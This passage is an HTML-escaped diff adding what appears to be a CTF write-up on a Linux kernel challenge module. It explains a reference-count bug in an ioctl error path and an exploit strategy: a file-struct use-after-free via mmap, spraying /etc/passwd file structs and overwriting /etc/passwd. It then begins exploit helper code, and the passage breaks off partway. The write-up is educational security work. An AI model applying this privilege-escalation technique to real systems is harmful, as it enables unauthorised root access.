+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rcu_assign_pointer&lt;&#x2F;span&gt;&lt;span&gt;(fdt-&amp;gt;fd[fd], &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;		
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;__clear_bit&lt;&#x2F;span&gt;&lt;span&gt;(fd, fdt-&amp;gt;open_fds);
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;__clear_bit&lt;&#x2F;span&gt;&lt;span&gt;(fd &#x2F; BITS_PER_LONG, fdt-&amp;gt;full_fds_bits);
+&lt;&#x2F;span&gt;&lt;span&gt;		
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(fd &amp;lt; files-&amp;gt;next_fd)
+&lt;&#x2F;span&gt;&lt;span&gt;			files-&amp;gt;next_fd = fd;
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;filp_close&lt;&#x2F;span&gt;&lt;span&gt;(file, files);
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This function is very similar to &lt;code&gt;close&lt;&#x2F;code&gt; syscall.&lt;&#x2F;p&gt;
+&lt;p&gt;Until the &lt;em&gt;files_struct&lt;&#x2F;em&gt; lock release, this function behaves the same way as &lt;code&gt;install_file&lt;&#x2F;code&gt; does.&lt;&#x2F;p&gt;
+&lt;p&gt;After the lock release, the given file descriptor is set to &lt;code&gt;NULL&lt;&#x2F;code&gt; and its corresponding bits are cleared in the bitmap. Later checks if it is necessary to update &lt;code&gt;next_fd&lt;&#x2F;code&gt; from &lt;em&gt;files_struct&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Finally, the file struct &lt;code&gt;f_count&lt;&#x2F;code&gt; is decremented with &lt;code&gt;filp_close(file, files)&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;exploit-strategy&quot;&gt;Exploit Strategy&lt;&#x2F;h2&gt;
+&lt;p&gt;By the time I started this challenge I had very little idea on how this could be exploited and I did some research where I could find this could technically be exploited through race conditions between the file description is assigned to the file struct and the new file descriptor is returned to the user. This can be checked &lt;a href=&quot;https:&#x2F;&#x2F;i.blackhat.com&#x2F;USA-22&#x2F;Wednesday&#x2F;US-22-Wu-Devils-Are-in-the-File.pdf&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;However, the intended solve is easier. If we check the error management of the &lt;code&gt;get_unused_fd_flags(0)&lt;&#x2F;code&gt; function within &lt;code&gt;install_file&lt;&#x2F;code&gt;, we can see there is something off.&lt;&#x2F;p&gt;
+&lt;p&gt;The important fragment of code is the following:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;	ret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_unused_fd_flags&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(ret &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;goto&lt;&#x2F;span&gt;&lt;span&gt; error;
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_file&lt;&#x2F;span&gt;&lt;span&gt;(file);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;span&gt;error:
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fput&lt;&#x2F;span&gt;&lt;span&gt;(file);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;-EBADF;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;If we can force &lt;code&gt;get_unused_fd_flags(0)&lt;&#x2F;code&gt; to fail, the &lt;em&gt;file&lt;&#x2F;em&gt; struct &lt;code&gt;f_count&lt;&#x2F;code&gt; will be decremented. This is a problem because at this moment, the &lt;code&gt;f_count&lt;&#x2F;code&gt; still has not been modified as it is incremented in &lt;code&gt;get_file(file)&lt;&#x2F;code&gt; function. This would allow us to decrement a file&#x27;s &lt;code&gt;f_count&lt;&#x2F;code&gt; at our will, which by the time it reaches &lt;code&gt;0&lt;&#x2F;code&gt;, the &lt;em&gt;file&lt;&#x2F;em&gt; struct will be released&#x2F;freed. This means that we could have the ability to free any &lt;em&gt;file&lt;&#x2F;em&gt; struct we control with a file descriptor.&lt;&#x2F;p&gt;
+&lt;p&gt;But how can we force &lt;code&gt;get_unused_fd_flags(0)&lt;&#x2F;code&gt; to fail? There&#x27;s a command called &lt;code&gt;prlimit&lt;&#x2F;code&gt; that modifies the resource limits of a given process. In &lt;code&gt;C&lt;&#x2F;code&gt;, we can use &lt;code&gt;prlimit&lt;&#x2F;code&gt; or &lt;code&gt;setprlimit&lt;&#x2F;code&gt; to modify the max number of open files (&lt;code&gt;RLIMIT_NOFILE&lt;&#x2F;code&gt;) a process can have. If we reach this limit, &lt;code&gt;get_unused_fd_flags(0)&lt;&#x2F;code&gt; will always return an error.&lt;&#x2F;p&gt;
+&lt;p&gt;Ok, so by this moment, we have found a way to free &lt;em&gt;file&lt;&#x2F;em&gt; structs. Now we need to leverage this to a UAF.
+To achieve this goal, we can check on how &lt;code&gt;mmap()&lt;&#x2F;code&gt; works.&lt;&#x2F;p&gt;
+&lt;p&gt;When &lt;code&gt;mmap()&lt;&#x2F;code&gt; asks for memory, the requested pages are not instantly mapped into memory. Instead, by the time you access the mapped region, it produces a &lt;code&gt;page fault&lt;&#x2F;code&gt; that, when handled, loads the requested pages.&lt;&#x2F;p&gt;
+&lt;p&gt;As a useful example, let&#x27;s check what happens in the kernel. We can map a temporary file into memory. Here, a &lt;em&gt;file&lt;&#x2F;em&gt; struct is assigned to the mapped region. Later, &lt;code&gt;call_mmap()&lt;&#x2F;code&gt; is called, which is a wrapper for &lt;code&gt;file-&amp;gt;f_op-&amp;gt;mmap()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; mmap.c
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.6.34&#x2F;source&#x2F;mm&#x2F;mmap.c#L2781
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;mmap_region&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;addr&lt;&#x2F;span&gt;&lt;span&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;, vm_flags_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vm_flags&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;unsigned long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pgoff&lt;&#x2F;span&gt;&lt;span&gt;,
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; list_head *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uf&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;span&gt;		vma-&amp;gt;vm_file = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_file&lt;&#x2F;span&gt;&lt;span&gt;(file);
+&lt;&#x2F;span&gt;&lt;span&gt;		error = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;call_mmap&lt;&#x2F;span&gt;&lt;span&gt;(file, vma);
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; fs.h
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.6.34&#x2F;source&#x2F;include&#x2F;linux&#x2F;fs.h#L2020
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;static inline int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;call_mmap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *file, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; vm_area_struct *vma)
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; file-&amp;gt;f_op-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mmap&lt;&#x2F;span&gt;&lt;span&gt;(file, vma);
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The previously mentioned &lt;code&gt;file-&amp;gt;f_op-&amp;gt;mmap()&lt;&#x2F;code&gt; points to the specific &lt;code&gt;mmap()&lt;&#x2F;code&gt; implementation for the file system that the file resides on. In our case, it is pointing to &lt;code&gt;ext4_file_mmap()&lt;&#x2F;code&gt;.
+Here, we can check how the &lt;code&gt;ext4&lt;&#x2F;code&gt; related operations are assigned:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.6.34&#x2F;source&#x2F;fs&#x2F;ext4&#x2F;file.c#L776
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;static const struct&lt;&#x2F;span&gt;&lt;span&gt; vm_operations_struct ext4_file_vm_ops = {
+&lt;&#x2F;span&gt;&lt;span&gt;	.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fault		&lt;&#x2F;span&gt;&lt;span&gt;= filemap_fault,
+&lt;&#x2F;span&gt;&lt;span&gt;	.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;map_pages	&lt;&#x2F;span&gt;&lt;span&gt;= filemap_map_pages,
+&lt;&#x2F;span&gt;&lt;span&gt;	.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;page_mkwrite   &lt;&#x2F;span&gt;&lt;span&gt;= ext4_page_mkwrite,
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.6.34&#x2F;source&#x2F;fs&#x2F;ext4&#x2F;file.c#L802
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;static int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;ext4_file_mmap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; vm_area_struct *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vma&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;span&gt;	vma-&amp;gt;vm_ops = &amp;amp;ext4_file_vm_ops;
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;At this point, the &lt;code&gt;mmap()&lt;&#x2F;code&gt; of the temporary file has finished. However, the mapped region still has not been accessed, so the pages of the file are not mapped into memory yet.
+The first time we try to access the mapped region, a &lt;code&gt;page fault&lt;&#x2F;code&gt; will be triggered so &lt;code&gt;vma-&amp;gt;vm_ops-&amp;gt;fault()&lt;&#x2F;code&gt; will be called:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.6.34&#x2F;source&#x2F;mm&#x2F;memory.c#L4227
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;static&lt;&#x2F;span&gt;&lt;span&gt; vm_fault_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;__do_fault&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; vm_fault *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vmf&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;span&gt;	ret = vma-&amp;gt;vm_ops-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fault&lt;&#x2F;span&gt;&lt;span&gt;(vmf);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;As it has been explained before, &lt;code&gt;vma-&amp;gt;vm_ops-&amp;gt;fault()&lt;&#x2F;code&gt; now points to &lt;code&gt;filemap_fault()&lt;&#x2F;code&gt; and here we can see how the actual file is finally accessed, so the file pages can finally be mapped into memory:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;linux&#x2F;v6.6.34&#x2F;source&#x2F;mm&#x2F;filemap.c#L3264
+&lt;&#x2F;span&gt;&lt;span&gt;vm_fault_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;filemap_fault&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; vm_fault *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vmf&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;{	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; error;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *file = vmf-&amp;gt;vma-&amp;gt;vm_file;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; file *fpin = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; address_space *mapping = file-&amp;gt;f_mapping;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; inode *inode = mapping-&amp;gt;host;
+&lt;&#x2F;span&gt;&lt;span&gt;	...
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;If we manage to free a &lt;em&gt;file&lt;&#x2F;em&gt; struct after it has been assigned a mapped region, but before this region has been accessed, and then we are capable of filling the freed space with another &lt;em&gt;file&lt;&#x2F;em&gt; struct pointing to another file, we will be able to map the pages of the second file with the permissions of the mapped region, giving us our wanted UAF :)&lt;&#x2F;p&gt;
+&lt;p&gt;Now that we have identified the UAF primitive, we can design a proper strategy to exploit it. To do so, we will go through the following steps:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Create a temporary file&lt;&#x2F;strong&gt;: create a file with &lt;code&gt;O_RDWR&lt;&#x2F;code&gt; permissions.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Map the temporary file&lt;&#x2F;strong&gt;: map the file into memory with &lt;code&gt;PROT_READ&lt;&#x2F;code&gt; and &lt;code&gt;PROT_WRITE&lt;&#x2F;code&gt; protections and the &lt;code&gt;MAP_SHARED&lt;&#x2F;code&gt; flag. This way we will be able to write into the desired file after leveraging the UAF primitive.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Drop &lt;code&gt;f_count&lt;&#x2F;code&gt; to &lt;code&gt;0&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;: drop the file&#x27;s &lt;code&gt;f_count&lt;&#x2F;code&gt; to &lt;code&gt;0&lt;&#x2F;code&gt; using the previously explained method so the file&#x27;s &lt;em&gt;file&lt;&#x2F;em&gt; struct is released&#x2F;freed.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; spraying&lt;&#x2F;strong&gt;: spray &lt;em&gt;file&lt;&#x2F;em&gt; structs pointing to critical files like &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt;. If we manage to allocate one of these &lt;em&gt;file&lt;&#x2F;em&gt; structs where the previous &lt;em&gt;file&lt;&#x2F;em&gt; struct was freed, we can leverage the UAF into an arbitrary read&#x2F;write.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Overwrite &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;: As the pages of the mapped region are allowed to be written, we can write into the mapped &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; and the changes will be carried through to the underlying file due to the &lt;code&gt;MAP_SHARED&lt;&#x2F;code&gt; flag.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Avoid kernel memory problems&lt;&#x2F;strong&gt;: Find a way to avoid problems with the messed kernel memory.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Have fun :)&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h2 id=&quot;exploit-development&quot;&gt;Exploit Development&lt;&#x2F;h2&gt;
+&lt;p&gt;To develop a cleaner exploit, we can use the following helper functions:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; ioctl IOCTL_CTF_INSTALL_FILE wrapper.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;install_file&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;device_fd&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fd&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; installed_fd = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ioctl&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, IOCTL_CTF_INSTALL_FILE, fd);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(installed_fd &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;warn&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[!] IOCTL_CTF_INSTALL_FILE failed&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; installed_fd;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; ioctl IOCTL_CTF_CLOSE_FILE wrapper.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;close_file&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;device_fd&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fd&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; res = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ioctl&lt;&#x2F;span&gt;&lt;span&gt;(device_fd, IOCTL_CTF_CLOSE_FILE, fd);
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(res &amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;[-] IOCTL_CTF_INSTALL_FILE failed&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;	}
+&lt;&#x2F;span&gt;&lt;span&gt;	
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;&#x2F; Limits the available amount of open files handable by the current process.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;set_fd_limit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cur&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; rlimit new, old;
